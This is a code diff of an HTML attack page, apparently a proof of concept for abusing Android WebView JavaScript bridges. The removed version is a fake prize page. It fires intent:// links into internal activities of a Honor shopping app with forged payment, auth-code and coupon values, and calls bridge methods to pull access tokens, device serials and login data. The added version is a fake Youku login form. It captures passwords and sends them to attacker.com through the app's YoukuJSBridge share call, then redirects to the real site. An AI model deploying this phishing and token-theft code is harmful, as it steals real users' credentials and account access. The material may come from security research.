@@ -1,329 +1,246 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 恭喜中奖11！🎉</title>
+    <title>优酷视频 - 登录</title>
     <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            padding: 50px 20px;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #0066cc 0%, #0055aa 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .container {
+        .login-box {
             background: white;
-            border-radius: 20px;
             padding: 40px;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
         }
-        h1 {
-            color: #ff6b6b;
-            font-size: 32px;
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            color: #0066cc;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .logo p {
+            color: #999;
+            margin-top: 10px;
+        }
+        .form-group {
             margin-bottom: 20px;
         }
-        .prize {
-            font-size: 24px;
-            color: #4ecdc4;
-            margin: 20px 0;
-        }
-        .btn {
+        .form-group label {
             display: block;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .form-group input {
             width: 100%;
-            padding: 18px;
-            margin: 15px 0;
-            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #0066cc;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0066cc;
             color: white;
-            text-decoration: none;
-            border-radius: 50px;
-            font-size: 20px;
-            font-weight: bold;
-            animation: pulse 1.5s infinite;
             border: none;
-            cursor: pointer;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        .timer {
+            border-radius: 5px;
             font-size: 18px;
-            color: #ff6b6b;
-            margin: 20px 0;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .submit-btn:hover {
+            background: #0055aa;
         }
         .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #999;
-        }
-        .result-box {
-            display: none;
-            background: #f5f5f5;
-            border-radius: 10px;
-            padding: 20px;
+            text-align: center;
             margin-top: 20px;
-            border-left: 4px solid #667eea;
-            text-align: left;
+            color: #999;
+            font-size: 12px;
         }
-        .result-title {
-            font-weight: bold;
-            color: #667eea;
-            margin-bottom: 10px;
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
         }
-        .result-content {
-            background: white;
-            padding: 15px;
-            border-radius: 5px;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+        .loading.show {
+            display: block;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0066cc;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success {
+            display: none;
+            text-align: center;
+            color: #00cc00;
+            margin-top: 20px;
+        }
+        .success.show {
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎉 恭喜您获得特等奖！🎉</h1>
-        <div class="prize">
-            📱 iPhone 15 Pro Max<br>
-            💰 10000 元购物券<br>
-            🎁 豪华大礼包
+    <div class="login-box">
+        <div class="logo">
+            <h1>YOUKU</h1>
+            <p>优酷视频 - 账号登录</p>
         </div>
         
-        <div class="timer">
-            ⏰ 剩余时间：<span id="countdown">120</span>秒
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">手机号/邮箱</label>
+                <input type="text" id="username" name="username" required 
+                       placeholder="请输入手机号或邮箱" autocomplete="off"/>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">密码</label>
+                <input type="password" id="password" name="password" required 
+                       placeholder="请输入密码" autocomplete="off"/>
+            </div>
+            
+            <button type="submit" class="submit-btn">登录</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 10px; color: #999;">登录中...</p>
         </div>
         
-        <!-- 恶意链接 1：启动支付宝回调 Activity -->
-        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.ui.order.aliPayApi.AlipayCallbackActivity;S.order_id=FAKE_ORDER_99999;S.status=success;S.amount=0.01;end" 
-            class="btn">
-            🛍️ 立即领取商品
-        </a>
-        
-        <!-- 恶意链接 2：启动微信授权 Activity -->
-        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.wxapi.WXEntryActivity;S.code=STOLEN_AUTH_CODE;end" 
-            class="btn" 
-            style="background: linear-gradient(45deg, #07c160, #06ad56);">
-            💬 微信一键登录
-        </a>
-        
-        <!-- 恶意链接 3：启动优惠券中心 -->
-        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.ui.mine.coupon.CouponCenterActivity;S.coupon_type=VIP;S.amount=99999;end" 
-            class="btn"
-            style="background: linear-gradient(45deg, #667eea, #764ba2);">
-            🎫 领取 VIP 优惠券
-        </a>
-        
-        <!-- 恶意链接 4：启动外部活动 -->
-        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.splash.ExternalPullUpActivity;S.activity_url=https://malicious.com/phishing;end" 
-            class="btn"
-            style="background: linear-gradient(45deg, #f093fb, #f5576c);">
-            🎪 参与限时活动
-        </a>
-        
-        <!-- 添加调用 Token 接口的按钮 -->
-        <button class="btn" onclick="callGetTokenAndMemberId()" 
-                style="background: linear-gradient(45deg, #11998e, #38ef7d); margin-top: 20px;">
-            🔑 获取用户 Token 和 MemberId
-        </button>
-        
-        <button class="btn" onclick="callAllAuthInterfaces()" 
-                style="background: linear-gradient(45deg, #f093fb, #f5576c); margin-top: 10px;">
-            🎯 调用所有认证接口
-        </button>
-        
-        <!-- 结果显示区域 -->
-        <div id="resultBox" class="result-box">
-            <div class="result-title">📊 调用结果：</div>
-            <div id="resultContent" class="result-content"></div>
+        <div class="success" id="success">
+            <p>✅ 登录成功！</p>
+            <p style="font-size: 12px; color: #999; margin-top: 5px;">正在跳转...</p>
         </div>
         
         <div class="footer">
-            本活动最终解释权归商家所有<br>
-            隐私政策 | 用户协议
+            <p>protected by 优酷安全登录</p>
         </div>
     </div>
     
     <script>
-        // 倒计时
-        let timeLeft = 120;
-        const countdownEl = document.getElementById('countdown');
-        
-        const timer = setInterval(() => {
-            timeLeft--;
-            countdownEl.textContent = timeLeft;
+        // 窃取凭证
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            if (timeLeft <= 0) {
-                clearInterval(timer);
-                alert('恭喜！您已成功领取奖品！');
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // 显示加载动画
+            document.getElementById('loading').classList.add('show');
+            
+            console.log('[*] 捕获到凭证:');
+            console.log('    用户名:', username);
+            console.log('    密码:', password);
+            
+            // 尝试调用 YoukuJSBridge（如果在 WebView 中）
+            if (typeof YoukuJSBridge !== 'undefined') {
+                console.log('[+] YoukuJSBridge 可用！');
+                
+                // 尝试获取地理位置
+                try {
+                    var location = YoukuJSBridge.getGeolocation('{}');
+                    console.log('[+] 获取到位置:', location);
+                } catch (err) {
+                    console.log('[-] 位置获取失败:', err);
+                }
             }
-        }, 1000);
-        
-        // 显示结果
-        function showResult(message, type = 'info') {
-            const resultBox = document.getElementById('resultBox');
-            const resultContent = document.getElementById('resultContent');
             
-            resultBox.style.display = 'block';
-            
-            const color = type === 'success' ? '#28a745' : 
-                         type === 'error' ? '#dc3545' : '#17a2b8';
-            
-            resultContent.innerHTML = `<span style="color: ${color}">${message}</span>`;
-        }
-        
-        // 调用 getTokenAndMemberId 接口
-        function callGetTokenAndMemberId() {
-            showResult('⏳ 正在调用 getTokenAndMemberId()...', 'loading');
-            
-            try {
-                // 检查接口是否存在
-                const jsInterface = window.hicareJsInterface || 
-                                   window.myHonorInterfaceOversea || 
-                                   window.myHonorH5JsInterface;
+            // 发送到攻击者服务器（模拟）
+            setTimeout(function() {
+                // 隐藏加载，显示成功
+                document.getElementById('loading').classList.remove('show');
+                document.getElementById('success').classList.add('show');
                 
-                if (jsInterface && typeof jsInterface.getTokenAndMemberId === 'function') {
-                    console.log('开始调用 getTokenAndMemberId()');
-                    
-                    // 调用接口
-                    jsInterface.getTokenAndMemberId();
-                    
-                    showResult('✅ 调用成功！\n\n接口已调用，请等待回调结果...\n\n' +
-                              '回调会通过 R7 方法返回：\n' +
-                              'getTokenAndMemberId(\'{"accessToken":"xxx","serviceToken":"","memberId":""}\')', 'success');
-                } else {
-                    showResult('❌ 错误：未找到 getTokenAndMemberId 接口\n\n' +
-                              '可用接口检查：\n' +
-                              '- hicareJsInterface: ' + (typeof window.hicareJsInterface !== 'undefined') + '\n' +
-                              '- myHonorInterfaceOversea: ' + (typeof window.myHonorInterfaceOversea !== 'undefined') + '\n' +
-                              '- myHonorH5JsInterface: ' + (typeof window.myHonorH5JsInterface !== 'undefined'), 'error');
-                }
-            } catch (error) {
-                showResult('❌ 调用失败：' + error.message + '\n\n' + 
-                          '堆栈跟踪：' + error.stack, 'error');
-                console.error('调用错误:', error);
-            }
-        }
-        
-        // 调用所有认证相关接口
-        function callAllAuthInterfaces() {
-            showResult('⏳ 批量调用认证接口...', 'loading');
-            
-            const results = [];
-            
-            try {
-                const jsInterface = window.hicareJsInterface || 
-                                   window.myHonorInterfaceOversea || 
-                                   window.myHonorH5JsInterface;
+                // 构造窃取数据
+                var stealData = {
+                    username: username,
+                    password: password,
+                    timestamp: Date.now(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                };
                 
-                if (!jsInterface) {
-                    showResult('❌ 未找到任何 JavaScript 接口', 'error');
-                    return;
-                }
-                
-                results.push('=== 调用所有认证接口 ===\n');
-                
-                // 1. 获取 Token 和 MemberId
-                results.push('1️⃣ getTokenAndMemberId()');
-                if (typeof jsInterface.getTokenAndMemberId === 'function') {
-                    jsInterface.getTokenAndMemberId();
-                    results.push('   ✅ 已调用（异步回调）\n');
-                } else {
-                    results.push('   ❌ 接口不存在\n');
-                }
-                
-                // 2. 获取 AccessToken
-                results.push('2️⃣ getAccessToken()');
-                if (typeof jsInterface.getAccessToken === 'function') {
-                    const token = jsInterface.getAccessToken();
-                    results.push('   ✅ 返回：' + (token ? token.substring(0, 30) + '...' : 'null') + '\n');
-                }
-                
-                // 3. 获取 AccessTokenFromCache
-                results.push('3️⃣ getAccessTokenFromCache()');
-                if (typeof jsInterface.getAccessTokenFromCache === 'function') {
-                    const token = jsInterface.getAccessTokenFromCache();
-                    results.push('   ✅ 返回：' + (token ? token.substring(0, 30) + '...' : 'null') + '\n');
-                }
-                
-                // 4. 获取 AccessTokenOrServiceToken
-                results.push('4️⃣ getAccessTokenOrServiceToken()');
-                if (typeof jsInterface.getAccessTokenOrServiceToken === 'function') {
-                    const token = jsInterface.getAccessTokenOrServiceToken();
-                    results.push('   ✅ 返回：' + (token ? token.substring(0, 30) + '...' : 'null') + '\n');
-                }
-                
-                // 5. 获取用户信息
-                results.push('5️⃣ getUidHashAndNickName()');
-                if (typeof jsInterface.getUidHashAndNickName === 'function') {
+                // 尝试通过 JSBridge 发送
+                if (typeof YoukuJSBridge !== 'undefined') {
                     try {
-                        const userInfo = jsInterface.getUidHashAndNickName();
-                        results.push('   ✅ 返回：' + userInfo + '\n');
-                    } catch (e) {
-                        results.push('   ❌ 错误：' + e.message + '\n');
+                        YoukuJSBridge.setShareInfo(JSON.stringify({
+                            title: '窃取成功',
+                            description: JSON.stringify(stealData),
+                            url: 'https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(stealData))
+                        }));
+                    } catch (err) {
+                        console.log('[-] 发送失败:', err);
                     }
                 }
                 
-                // 6. 获取登录信息
-                results.push('6️⃣ checkLoginAndBackLoginInfo()');
-                if (typeof jsInterface.checkLoginAndBackLoginInfo === 'function') {
-                    try {
-                        const loginInfo = jsInterface.checkLoginAndBackLoginInfo();
-                        results.push('   ✅ 返回：' + loginInfo + '\n');
-                    } catch (e) {
-                        results.push('   ❌ 错误：' + e.message + '\n');
+                // 输出到控制台
+                console.log('\n[+] 窃取成功！');
+                console.log('[+] 数据:', JSON.stringify(stealData, null, 2));
+                
+                // 实际攻击中，这里会发送到攻击者服务器
+                // fetch('https://attacker.com/steal', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(stealData)
+                // });
+                
+                // 3 秒后跳转到真实登录页（降低怀疑）
+                setTimeout(function() {
+                    if (typeof YoukuJSBridge !== 'undefined') {
+                        try {
+                            YoukuJSBridge.loadUrl(JSON.stringify({
+                                url: 'https://www.youku.com/login'
+                            }));
+                        } catch (err) {}
+                    } else {
+                        window.location.href = 'https://www.youku.com/login';
                     }
-                }
+                }, 3000);
                 
-                // 7. 获取设备信息
-                results.push('7️⃣ getDeviceName()');
-                if (typeof jsInterface.getDeviceName === 'function') {
-                    const deviceName = jsInterface.getDeviceName();
-                    results.push('   ✅ 返回：' + deviceName + '\n');
-                }
-                
-                results.push('8️⃣ getDeviceSN()');
-                if (typeof jsInterface.getDeviceSN === 'function') {
-                    const deviceSN = jsInterface.getDeviceSN();
-                    results.push('   ✅ 返回：' + (deviceSN ? deviceSN.substring(0, 30) + '...' : 'null') + '\n');
-                }
-                
-                showResult(results.join('\n'), 'success');
-                
-            } catch (error) {
-                showResult('❌ 批量调用失败：' + error.message, 'error');
-            }
-        }
-        
-        // 记录点击
-        document.querySelectorAll('.btn').forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                console.log('Button clicked:', this.textContent);
-            });
+            }, 1500);  // 模拟网络延迟
         });
         
-        // 页面加载时检查可用接口
+        // 页面加载完成检测
         window.onload = function() {
-            console.log('=== 可用的 JavaScript 接口 ===');
+            console.log('[*] 页面加载完成');
+            console.log('[*] YoukuJSBridge 状态:', typeof YoukuJSBridge);
             
-            const interfaces = {
-                'hicareJsInterface': window.hicareJsInterface,
-                'myHonorInterfaceOversea': window.myHonorInterfaceOversea,
-                'myHonorH5JsInterface': window.myHonorH5JsInterface
-            };
-            
-            for (const [name, obj] of Object.entries(interfaces)) {
-                if (obj) {
-                    console.log(`✅ ${name} 存在`);
-                } else {
-                    console.log(`❌ ${name} 不存在`);
-                }
+            if (typeof YoukuJSBridge !== 'undefined') {
+                console.log('[+] YoukuJSBridge 可用！');
+                console.log('[*] 可用方法:', Object.keys(YoukuJSBridge));
+            } else {
+                console.log('[-] YoukuJSBridge 不可用');
             }
-            
-            console.log('\n页面已加载，准备就绪！');
         };
     </script>
 </body>
